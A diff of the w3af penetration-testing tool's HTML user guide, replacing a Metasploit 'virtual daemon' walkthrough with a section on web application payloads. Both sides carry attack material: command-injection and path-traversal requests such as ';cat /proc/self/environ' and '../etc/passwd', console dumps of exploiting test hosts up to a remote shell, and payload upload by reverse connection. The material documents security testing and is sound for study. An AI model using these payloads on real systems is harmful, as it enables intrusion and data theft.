+	<I>expose</I> <B>exec()</B></P>
+	<LI><P STYLE="margin-bottom: 0in">SQL Injection Vulnerabilities
+	<I>expose</I> <B>read(), write() </B>and possibly<B> exec()</B></P>
 </UL>
-<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">Both of
-them are simple to use and configure using this guide. These features
-are under heavy development and are under no means stable, use them
-at your on risk.</FONT></P>
 <P ALIGN=JUSTIFY><BR><BR>
 </P>
-<H3 CLASS="western" ALIGN=JUSTIFY STYLE="margin-top: 0in">Virtual
-daemon</H3>
+<P STYLE="margin-bottom: 0in">Web Application Payloads are small
+pieces of code that are run in the intruder’s box, and then
+translated by the Web Application exploit to a combination of GET and
+POST requests to be sent to the remote Web server. For example, a
+call to the emulated syscall read() with “/proc/self/environ” as
+a parameter would generate this request when it’s run through an
+arbitrary file read vulnerability:</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">	<FONT FACE="Nimbus Mono L, monospace">http://host.tld/read.php?file=/proc/self/environ</FONT></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">And this other request when exploiting
+an OS Commanding vulnerability:</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">	<FONT FACE="Nimbus Mono L, monospace">http://host.tld/os.php?cmd=;cat
+/proc/self/environ</FONT></P>
 <P ALIGN=JUSTIFY><BR><BR>
 </P>
-<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">As said
-before, this feature allows you to use metasploit payloads to exploit
-the server that supports a vulnerable web application. To use this
-feature you must have a working installation of the metasploit
-framework version 3.0 or greater; you can get it for free at
-<A HREF="http://www.metasploit.com/">www.metasploit.com</A> , the
-installation and configuration of MSF is out of the scope of this
-document.</FONT></P>
-<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">To be
-able to use the virtual daemon you will need to run the following
-command in order to copy the w3af metasploit module into the MSF
-directory:</FONT></P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">./w3af_console
--i /home/jdoe/tools/msf/</FONT></P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><BR><BR>
+<P ALIGN=JUSTIFY><BR><BR>
 </P>
-<P ALIGN=JUSTIFY>Where “<FONT FACE="Nimbus Mono L, monospace">/home/jdoe/tools/msf/</FONT><FONT FACE="Bitstream Vera Sans, sans-serif">”
-is the directory where the user “jdoe” installed Metasploit. I</FONT>n
-case you are interested, this is just a fancy shortcut for “<FONT FACE="Nimbus Mono L, monospace">cp
-</FONT><FONT FACE="Nimbus Mono L, monospace">core/controllers/vdaemon/w3af_vdaemon.rb
-/home/user/tools/msf/modules/exploits/unix/misc/</FONT>”. Once this
-has been done, the user can start using the virtual daemon feature,
-before going through an example to see how to use the feature, we
-will make a summary of the steps that will happened during the
-exploitation:</P>
-<OL>
-	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">w3af
-	finds a vulnerability that allows remote command execution</FONT></P>
-	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">The
-	user exploits the vulnerability and starts the virtual daemon</FONT></P>
-	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">The
-	user starts the metasploit framework</FONT></P>
-	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">The
-	user configures the w3af module inside MSF and executes it</FONT></P>
-	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">w3af
-	module inside MSF will connect to the virtual daemon that is
-	listening on localhost</FONT></P>
-	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">MSF
-	will send the payload selected by the user to the virtual daemon</FONT></P>
-	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">The
-	virtual daemon will create a PE(portable executable) or an
-	ELF(executable and linkable format) file depending on the remote
-	operating system, and using the exploited vulnerability it will
-	upload and execute the payload in the remote server</FONT></P>
-	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">The
-	process of uploading the file to the remote server depends on the
-	remote operating system, the privileges of the user running w3af and
-	the local operating system; but in most cases the following happens:</FONT></P>
-</OL>
-<UL>
-	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">w3af
-	sends a small executable to the remote server to perform an
-	extrusion scan.</FONT></P>
-	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">w3af
-	sniffs on the configured interface ( misc-settings -&gt; interface )
-	for packets that arrive on the expected ports in order to verify
-	outgoing firewall rules on the remote network</FONT></P>
-	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">If
-	a TCP port is found to be allowed in the remote firewall, w3af will
-	try </FONT><FONT FACE="Bitstream Vera Sans, sans-serif">to run a
-	server on that port and make a reverse connection from the
-	</FONT>compromised host in order to download the PE/ELF generated
-	file.<FONT FACE="Bitstream Vera Sans, sans-serif"> If </FONT><FONT FACE="Bitstream Vera Sans, sans-serif">no
-	TCP ports are enabled, w3af will send the ELF/PE file to the remote
-	</FONT><FONT FACE="Bitstream Vera Sans, sans-serif">server using
-	several calls to the “echo” command, which is rather slow, but
-	should always work because it's an in-band transfer method.</FONT></P>
-</UL>
-<OL>
-	<LI VALUE=1><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">The
-	payload runs in the remote server and possibly connects back to the
-	metasploit framework, that will handle the rest of the exploitation.</FONT></P>
-</OL>
-<OL>
-	<P ALIGN=JUSTIFY></P>
-</OL>
-<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">Now
-that we know the theory, let's see an example of what this feature
-can do:</FONT></P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>$</B>
-./w3af_console </FONT>
+<H3 CLASS="western" ALIGN=JUSTIFY STYLE="margin-top: 0in">Running Web
+Application Payloads</H3>
+<P STYLE="margin-bottom: 0in">The following is a console dump from
+w3af scanning a vulnerable application, exploiting a vulnerability
+and then running the <FONT FACE="Helvetica, serif"><FONT SIZE=3>list_processes</FONT></FONT><FONT FACE="Helvetica, serif"><FONT SIZE=2 STYLE="font-size: 11pt">
+</FONT></FONT>payload, the most important sections are marked in <B>bold
+</B>for fast reading:</P>
+<P STYLE="margin-bottom: 0in"><BR>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
-plugins </FONT>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	w3af&gt;&gt;&gt;
+plugins</FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace"><B>	</B><B>w3af/plugins&gt;&gt;&gt;
+audit localFileInclude</B></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	w3af/plugins&gt;&gt;&gt;
+back</FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	w3af&gt;&gt;&gt;
+target</FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	w3af/config:target&gt;&gt;&gt;
+set target</FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	http://localhost/local_file_read.php?file=section.txt</FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	w3af/config:target&gt;&gt;&gt;
+back</FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	w3af&gt;&gt;&gt;
+start</FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	Found
+1 URLs and 1 different points of injection.</FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	The
+list of URLs is:</FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	-
+http://localhost/local_file_read.php</FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	The
+list of fuzzable requests is:</FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	-
+http://localhost/local_file_read.php | Method: GET | 	Parameters:
+(file=&quot;section.txt&quot;)</FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	Starting
+localFileInclude plugin execution.</FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace"><B>	Local
+File Inclusion was found at: 	&quot;http://localhost/local_file_read.php&quot;,
+using</B></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace"><B>	HTTP
+method GET. The sent data was:
+	&quot;file=../../../../../../../../etc/passwd&quot;.</B></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace"><B>	This
+vulnerability was found in the request with id 3.</B></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	Finished
+scanning process.</FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	w3af&gt;&gt;&gt;
+exploit</FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace"><B>	w3af/exploit&gt;&gt;&gt;
+exploit localFileReader</B></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	localFileReader
+exploit plugin is starting.</FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	The
+vulnerability was found using method GET, but POST is being 	used
+during this exploit. Vulnerability successfully exploited. 	This is a
+list of available shells and proxies:</FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	-
+[0] &lt;shell object (rsystem: &quot;*nix&quot;)&gt;</FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	</FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	Please
+use the interact command to interact with the shell	objects.</FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace"><B>	w3af/exploit&gt;&gt;&gt;
+interact 0</B></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	Execute
+&quot;endInteraction&quot; to get out of the remote shell. 	Commands
+typed in this menu will be runned through the 	localFileReader shell</FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace"><B>	w3af/exploit/localFileReader-0&gt;&gt;&gt;
+payload list_processes</B></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	...</FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	PID
+   NAME                STATUS              CMD                       
+   </FONT>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
-plugins </FONT>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	1
+     init                S (sleeping)        /sbin/init              
+     </FONT>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
-audit osCommanding </FONT>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	2
+     kthreadd            S (sleeping)        [kernel process]        
+     </FONT>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
-audit </FONT>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	3
+     migration/0         S (sleeping)        [kernel process]        
+     </FONT>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Enabled
-audit plugins: </FONT>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	4
+     ksoftirqd/0         S (sleeping)        [kernel process]        
+     </FONT>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">osCommanding
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	5
+     watchdog/0          S (sleeping)        [kernel process]        
+     </FONT>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	6
+     migration/1         S (sleeping)        [kernel process]        
+     </FONT>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	7
+     ksoftirqd/1         S (sleeping)        [kernel process]        
+     </FONT>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	8
+     watchdog/1          S (sleeping)        [kernel process]        
+     </FONT>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	...</FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	...</FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	5183
+  mysqld              S (sleeping)        /usr/sbin/mysqld
+											   --basedir=/usr</FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	...</FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	...</FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	5890
+  cupsd               S (sleeping)        /usr/sbin/cupsd            
+  </FONT>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	6038
+  privoxy             S (sleeping)        /usr/sbin/privoxy </FONT>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	...
 </FONT>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
-back </FONT>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	12805
+ apache2             S (sleeping)        /usr/sbin/apache2    </FONT>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
-target </FONT>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Nimbus Mono L, monospace">	w3af/exploit/localFileReader-0&gt;&gt;&gt;</FONT></P>
+<P STYLE="margin-bottom: 0in"><BR>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/target&gt;&gt;&gt;</B>
-set target http://172.16.1.128/os.php?cmd=f00 </FONT>
+<P STYLE="margin-bottom: 0in">This shows how it’s possible to
+retrieve the <B>full list of running process with a simple arbitrary
+file read vulnerability. </B>Similar examples that are able to read
+the open TCP/IP connections, operating system IP route table, and
+much more information are not shown for the sake of brevity.</P>
+<P STYLE="margin-bottom: 0in"><BR>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/target&gt;&gt;&gt;</B>
-back </FONT>
+<P STYLE="margin-bottom: 0in">The “lsp” command lists the
+available payloads, it's important to notice that the list of
+payloads that can be run changes based on the used exploit. For
+example, running “lsp” inside a remote file inclusion shell will
+most likely return a list of all payloads, while running it inside a
+local file read shell will return the payloads that can be run when
+the vulnerability exposes only the read() syscall.</P>
+<P ALIGN=JUSTIFY><BR><BR>
 </P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
-start </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">The
-list of found URLs is: </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
-http://172.16.1.128/os.php </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Found
-1 URLs and 1 different points of injection. </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">The
-list of Fuzzable requests is: </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
-http://172.16.1.128/os.php | Method: GET | Parameters: (cmd) </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Starting
-osCommanding plugin execution. </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">OS
-Commanding was found at: http://172.16.1.128/os.php . Using method:
-GET. The data sent was: cmd=type+%25SYSTEMROOT%25%5Cwin.ini The
-vulnerability was found in the request with id 7. </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
-exploit </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit&gt;&gt;&gt;</B>
-exploit osCommandingShell </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">osCommanding
-exploit plugin is starting. </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">The
-vulnerability was found using method GET, tried to change the method
-to POST for exploiting but failed. </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Vulnerability
-successfully exploited. </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Execute
-&quot;exitPlugin&quot; to get out of the remote shell. Commands typed
-in this menu will be runned on the remote web server. </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit/osCommandingShell&gt;&gt;&gt;</B>
-<B>start vdaemon </B></FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Virtual
-daemon service is running on port 9091, use metasploit's w3af_vdaemon
-module to exploit it. </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit/osCommandingShell&gt;&gt;&gt;
-</B></FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><BR><BR>
-</P>
-<P ALIGN=JUSTIFY>Nothing special for now, just added the new “<FONT FACE="Nimbus Mono L, monospace"><SPAN STYLE="font-weight: normal">start
-vdaemon</SPAN></FONT>” command. With this w3af run we have covered
-items 1. and 2. of the theory. The next step is to configure the MSF
-module and run it; my preferred way is to use metasploit's web
-interface “msfweb”. The first step is to click on the “Exploit”
-button on the main menu. This will cause a small window to appear. In
-this window, you should search for <I>w3af </I>and then select the
-exploit named: “w3af virtual daemon exploit”. Some important
-points to have in mind while configuring the w3af agent virtual
-daemon module inside MSF:</P>
+<H3 CLASS="western">Metasploit integration</H3>
+<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">There
+are a set of web application payloads which can be used to interact
+with the metasploit framework. When the exploit provides the exec()
+syscall to the payloads, this allows the w3af user to upload
+metasploit payloads to the target system and execute them to continue
+the post-exploitation process.</FONT></P>
 <UL>
-	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">The
-	target is of course the remote operating system you are exploiting</FONT></P>
-	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">VNC
-	payloads don't seem to work</FONT></P>
-	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">RHOST
-	parameter indicates the IP address of the server you are exploiting</FONT></P>
-	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">LHOST
-	is your public IP address</FONT></P>
-	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">LPORT
-	is a port where the remote web server can connect to (when using
-	reverse connect payloads) or you can connect to ( when using bind
-	payloads )</FONT></P>
-	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">The
-	w3af module inside metasploit will connect to localhost:9091 and do
-	all the payload transfer, this parameters can't be configured and
-	must not be confused with RHOST/LHOST and LPORT</FONT></P>
-</UL>
-<P ALIGN=JUSTIFY><BR><BR>
-</P>
-<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">Once it
-has been configured, we can click on “Launch Exploit” to start
-the process, this is what we will see in the w3af console:</FONT></P>
-<P ALIGN=JUSTIFY><BR><BR>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit/osCommandingShell&gt;&gt;&gt;</B>
-</FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Please
-wait some seconds while w3af performs an extrusion scan. </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">The
-extrusion test failed, no reverse connect transfer methods can be
-used. Trying inband echo transfer method. </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Error:
-The user running w3af can't sniff on the specified interface. Hints:
-Are you root? Does this interface exist? </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Successfully
-transfered the MSF payload to the remote server. </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Successfully
-executed the MSF payload on the remote server. </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><BR><BR>
-</P>
-<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">The
-last messages are printed when you run w3af as a normal user, the
-reason is </FONT><FONT FACE="Bitstream Vera Sans, sans-serif">simple,
-when you run w3af as a user you can't sniff and </FONT>therefore<FONT FACE="Bitstream Vera Sans, sans-serif">
-can't perform a </FONT><FONT FACE="Bitstream Vera Sans, sans-serif">successful
-extrusion scan. A successful extrusion scan would look like:</FONT></P>
-<P ALIGN=JUSTIFY><BR><BR>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Please
-wait some seconds while w3af performs an extrusion scan. </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">ExtrusionServer
-listening on interface: eth1</FONT></P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Finished
-extrusion scan. </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">The
-remote host: &quot;172.10.10.1&quot; can connect to w3af with these
-ports: </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
-25/TCP </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
-80/TCP </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
-53/TCP </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
-1433/TCP </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
-8080/TCP </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
-53/UDP </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
-69/UDP </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
-139/UDP </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
-1025/UDP </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">The
-following ports are not bound to a local process and can be used by
-w3af: </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
-25/TCP </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
-53/TCP </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
-1433/TCP </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
-8080/TCP </FONT>
-</P>
-<P ALIGN=JUSTIFY><FONT FACE="Nimbus Mono L, monospace">Selecting port
-&quot;8080/TCP&quot; for inbound connections from the compromised
-server to w3af. </FONT>
-</P>
-<P ALIGN=JUSTIFY><BR><BR>
-</P>
-<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">And if
-we take a look at the metasploit web interface we will find something
-far more interesting:</FONT></P>
-<P ALIGN=JUSTIFY><BR><BR>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">[*]
-Started reverse handler </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">[*]
-The remote IP address is: 172.16.1.128 </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">[*]
-Using remote IP address to create payloads. </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">[*]
-Sent payload to vdaemon. </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">[*]
-The estimated time to wait for the extrusion scan to complete is: 1
-seconds. </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">[*]
-Done waiting! </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">[*]
-The estimated time to wait for PE/ELF transfer is: 8 seconds. </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">[*]
-Waiting... </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">[*]
-Done waiting! </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">[*]
-Going to wait for 27 seconds (waiting for crontab/at to execute
-payload). </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">[*]
-The session could start before the handler, so please *be patient*. </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">[*]
-Command shell session 1 opened (172.16.1.1:4444 -&gt;
-172.16.1.128:1047) </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">[*]
-Done waiting! </FONT>
-</P>
-<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">[*]
-Starting handler </FONT>
-</P>
-<OL TYPE=I START=100>
-	<P ALIGN=JUSTIFY><FONT FACE="Nimbus Mono L, monospace">Microsoft
-	Windows 2000 [Version 5.00.2195] </FONT>
+	<LI><P ALIGN=JUSTIFY STYLE="margin-bottom: 0in"><FONT FACE="Bitstream Vera Sans, sans-serif">msf_linux_x86_meterpreter_reverse
+	</FONT>
 	</P>
-	<P ALIGN=JUSTIFY><FONT FACE="Nimbus Mono L, monospace">(C) Copyright
-	1985-2000 Microsoft Corp.</FONT></P>
-	<P ALIGN=JUSTIFY></P>
-	<P ALIGN=JUSTIFY><FONT FACE="Nimbus Mono L, monospace">C:\WINNT\system32&gt;</FONT></P>
